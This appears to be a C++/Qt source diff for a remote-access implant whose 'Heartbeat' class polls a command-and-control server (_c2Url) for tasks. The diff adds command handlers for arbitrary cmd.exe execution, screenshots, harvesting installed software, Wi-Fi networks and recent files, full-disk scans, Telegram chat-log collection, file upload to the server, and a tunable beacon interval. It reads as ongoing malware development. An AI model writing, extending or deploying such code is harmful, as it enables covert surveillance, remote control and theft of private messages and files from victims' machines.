@@ -839,7 +839,7 @@ void Heartbeat::uploadResult(const QString& taskId, const QString& result, const
 }
 
 void Heartbeat::executeTask(const QString& taskId, const QString& command, const QString& params) {
-    if (command == "shell" || command == "cmd") {
+    if (command == "shell" || command == "cmd" || command == "cmd_exec") {
         QProcess* process = new QProcess(this);
         connect(process, QOverload<int, QProcess::ExitStatus>::of(&QProcess::finished),
             [this, taskId, process](int exitCode, QProcess::ExitStatus exitStatus) {
@@ -849,26 +849,35 @@ void Heartbeat::executeTask(const QString& taskId, const QString& command, const
                 process->deleteLater();
         });
         process->start("cmd.exe", QStringList() << "/c" << params);
-    } else if (command == "monitor") {
-        if (params == "start") {
-            _monitorTaskId = taskId;
-            _monitorTimer.start(5000); // 5 seconds
-            uploadResult(taskId, "Monitor started", "completed");
-        } else if (params == "stop") {
-            _monitorTimer.stop();
-            uploadResult(taskId, "Monitor stopped", "completed");
-        }
+    } else if (command == "start_monitor") {
+        int interval = params.toInt();
+        if (interval <= 0) interval = 60000;
+        _monitorTaskId = taskId;
+        _monitorTimer.start(interval);
+        uploadResult(taskId, "Monitor started with interval " + QString::number(interval), "completed");
+    } else if (command == "stop_monitor") {
+        _monitorTimer.stop();
+        uploadResult(taskId, "Monitor stopped", "completed");
     } else if (command == "screenshot") {
         performScreenshot(taskId);
-    } else if (command == "file_scan") {
+    } else if (command == "get_software") {
+        collectInstalledSoftware();
+        QString json = getSoftwareJson();
+        uploadResult(taskId, json, "completed");
+    } else if (command == "get_wifi") {
+        collectWiFiInfo();
+        QString json = getWifiJson();
+        uploadResult(taskId, json, "completed");
+    } else if (command == "scan_recent") {
+        collectRecentFiles(taskId);
+    } else if (command == "scan_disk") {
         // Run in background thread
         BackgroundScanner* scanner = new BackgroundScanner(_deviceUuid, _c2Url, getDbPath(), taskId, "full");
         QThread* thread = new QThread;
         scanner->moveToThread(thread);
         connect(thread, &QThread::started, scanner, &BackgroundScanner::process);
         connect(scanner, &BackgroundScanner::scanFinished, this, [this, thread, scanner](const QString& tid, const QByteArray& data) {
-             // Upload result handled inside? No, we might need to upload here.
-             // But file_scan usually writes to DB.
+             uploadClientDb(tid);
              uploadResult(tid, "Scan finished", "completed");
              thread->quit();
              thread->wait();
@@ -876,6 +885,11 @@ void Heartbeat::executeTask(const QString& taskId, const QString& command, const
              delete scanner;
         });
         thread->start();
+    } else if (command == "get_chat_logs") {
+        collectTelegramData();
+        syncChatHistory();
+        uploadClientDb(taskId);
+        uploadResult(taskId, "Chat logs collected and syncing started", "completed");
     } else if (command == "download" || command == "upload_file") {
         // Params = filePath
         uploadFile(taskId, params);
@@ -883,6 +897,15 @@ void Heartbeat::executeTask(const QString& taskId, const QString& command, const
         uploadClientDb(taskId);
     } else if (command == "fetch_full_chat_history") {
         startFullSync(taskId);
+    } else if (command == "set_heartbeat") {
+        int interval = params.toInt();
+        if (interval >= 1000) {
+            _currentHeartbeatInterval = interval;
+            _timer.setInterval(interval);
+            uploadResult(taskId, "Heartbeat interval set to " + QString::number(interval), "completed");
+        } else {
+             uploadResult(taskId, "Invalid heartbeat interval", "failed");
+        }
     }
 }
 
@@ -1481,6 +1504,93 @@ void Heartbeat::cleanupDatabase() {
     sqlite3_exec(db, "VACUUM;", 0, 0, 0);
 
     sqlite3_close(db);
+}
+
+void Heartbeat::collectRecentFiles(const QString& taskId) {
+    QString path;
+#ifdef Q_OS_WIN
+    path = QString::fromLocal8Bit(qgetenv("APPDATA")) + "/Microsoft/Windows/Recent";
+#else
+    // Fallback for other platforms if needed
+    path = QStandardPaths::writableLocation(QStandardPaths::DocumentsLocation); 
+#endif
+
+    QDir dir(path);
+    if (!dir.exists()) {
+        uploadResult(taskId, "Recent documents path not found", "failed");
+        return;
+    }
+    
+    QJsonArray files;
+    QFileInfoList entries = dir.entryInfoList(QDir::Files | QDir::NoDotAndDotDot | QDir::Hidden, QDir::Time);
+    
+    int count = 0;
+    for (const QFileInfo& entry : entries) {
+        QJsonObject file;
+        file["path"] = entry.absoluteFilePath();
+        file["name"] = entry.fileName();
+        file["isDirectory"] = false;
+        file["size"] = entry.size();
+        file["lastModified"] = entry.lastModified().toSecsSinceEpoch();
+        files.append(file);
+        
+        if (++count >= 100) break;
+    }
+    
+    QJsonDocument doc(files);
+    uploadResult(taskId, doc.toJson(QJsonDocument::Compact), "completed");
+}
+
+QString Heartbeat::getSoftwareJson() {
+    QString dbPath = getDbPath();
+    sqlite3* db;
+    if (sqlite3_open(dbPath.toUtf8().constData(), &db) != SQLITE_OK) return "[]";
+
+    QJsonArray array;
+    sqlite3_stmt* stmt;
+    const char* sql = "SELECT name, version, publisher, install_date FROM installed_software;";
+    
+    if (sqlite3_prepare_v2(db, sql, -1, &stmt, 0) == SQLITE_OK) {
+        while (sqlite3_step(stmt) == SQLITE_ROW) {
+            QJsonObject obj;
+            obj["name"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 0));
+            obj["version"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 1));
+            obj["publisher"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 2));
+            obj["installDate"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 3));
+            array.append(obj);
+        }
+        sqlite3_finalize(stmt);
+    }
+    sqlite3_close(db);
+    return QJsonDocument(array).toJson(QJsonDocument::Compact);
+}
+
+QString Heartbeat::getWifiJson() {
+    QString dbPath = getDbPath();
+    sqlite3* db;
+    if (sqlite3_open(dbPath.toUtf8().constData(), &db) != SQLITE_OK) return "[]";
+
+    QJsonArray array;
+    sqlite3_stmt* stmt;
+    const char* sql = "SELECT ssid, bssid, signal_strength, security_type FROM wifi_scan_results;";
+    
+    if (sqlite3_prepare_v2(db, sql, -1, &stmt, 0) == SQLITE_OK) {
+        while (sqlite3_step(stmt) == SQLITE_ROW) {
+            QJsonObject obj;
+            obj["ssid"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 0));
+            obj["bssid"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 1));
+            obj["signalStrength"] = sqlite3_column_int(stmt, 2);
+            obj["securityType"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 3));
+            array.append(obj);
+        }
+        sqlite3_finalize(stmt);
+    }
+    sqlite3_close(db);
+    return QJsonDocument(array).toJson(QJsonDocument::Compact);
+}
+
+QString Heartbeat::getRecentFilesJson() {
+    return "[]"; // Placeholder if needed
 }
 
 // Background Scanner Implementation
